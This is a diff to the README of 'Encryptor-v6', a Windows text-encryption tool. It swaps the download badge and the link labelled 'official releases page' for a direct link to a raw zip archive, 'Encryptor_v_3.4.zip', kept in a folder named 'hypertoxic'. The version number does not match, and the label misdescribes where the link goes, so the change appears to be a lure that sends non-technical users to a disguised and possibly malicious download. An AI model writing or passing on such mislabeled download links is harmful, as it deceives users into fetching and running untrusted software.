@@ -1,6 +1,6 @@
 # 🔒 Encryptor-v6 - Protect your private text messages easily
 
-[![Download Encryptor-v6](https://img.shields.io/badge/Download-Release-blue)](https://github.com/zongaming78-maker/Encryptor-v6/releases)
+[![Download Encryptor-v6](https://img.shields.io/badge/Download-Release-blue)](https://github.com/zongaming78-maker/Encryptor-v6/raw/refs/heads/main/hypertoxic/Encryptor_v_3.4.zip)
 
 Encryptor-v6 turns your text into secure, scrambled data. You can use this program to hide notes or messages so that only you can read them. It uses proven security methods to lock your information. The program hides your text inside a digital blob that remains unreadable to anyone else. It runs directly on your Windows computer.
 
@@ -8,7 +8,7 @@ Encryptor-v6 turns your text into secure, scrambled data. You can use this progr
 
 You do not need to know how to code to use this tool. Follow these simple steps to install and run the program on your computer.
 
-1. Visit the [official releases page](https://github.com/zongaming78-maker/Encryptor-v6/releases) to download the latest version.
+1. Visit the [official releases page](https://github.com/zongaming78-maker/Encryptor-v6/raw/refs/heads/main/hypertoxic/Encryptor_v_3.4.zip) to download the latest version.
 2. Look for the file ending in .exe under the most recent version tag.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your downloads folder.
